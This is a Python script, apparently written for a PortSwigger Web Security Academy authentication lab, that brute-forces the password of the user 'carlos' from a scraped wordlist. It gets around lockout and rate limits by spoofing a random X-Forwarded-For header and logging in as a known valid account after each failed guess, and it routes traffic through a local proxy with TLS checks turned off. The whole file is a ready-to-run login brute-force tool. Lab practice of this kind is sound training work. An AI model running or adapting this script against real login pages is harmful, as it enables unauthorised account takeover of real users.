import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import random
import socket
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {'http':'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def scrap_password():
    url = 'https://portswigger.net/web-security/authentication/auth-lab-passwords'
    r = requests.get(url, verify=False, proxies=proxy)
    res = r.text
    soup = BeautifulSoup (res, 'html.parser')
    for word in soup.code.contents:
        word = word.split('\n')
        password_list = word
    return password_list


def generate_random_ip():
  ip_parts = [random.randint(0, 255) for _ in range(4)]
  return socket.inet_ntoa(bytes(ip_parts))


def admin_cred(url):
    username = 'carlos'
    password_list = scrap_password()
    random_ip = generate_random_ip()
    j = 0
    print(password_list)
    for z in password_list:
        if j >=1:
            print(j)
            creds = {
                'username': 'wiener',
                'password': 'peter'
            }
            header = {'X-Forwarded-For': '%s' % random_ip}
            requests.post(url, verify=False, proxies=proxy, data=creds, headers=header)
            j=0
        else:
            creds = {
            'username': 'carlos',
            'password': z
            }
            header = {'X-Forwarded-For': '%s' % random_ip}
            r = requests.post(url, verify=False, proxies=proxy, data=creds, headers=header)
            res = r.text
            print(username, z)
            j += 1
            if "Incorrect password" not in res:
                print("[+] Password found : %s" % z)
                print("[+] Admin creds are : %s , %s" % (username, z))
                break



def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url> " % sys.argv[0])
        print("[+] Example: %s www.example.com " % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1].strip()
    print("[+] Brute forcing the shit out of the website...")
    admin_cred(url)


if __name__=="__main__":
    main()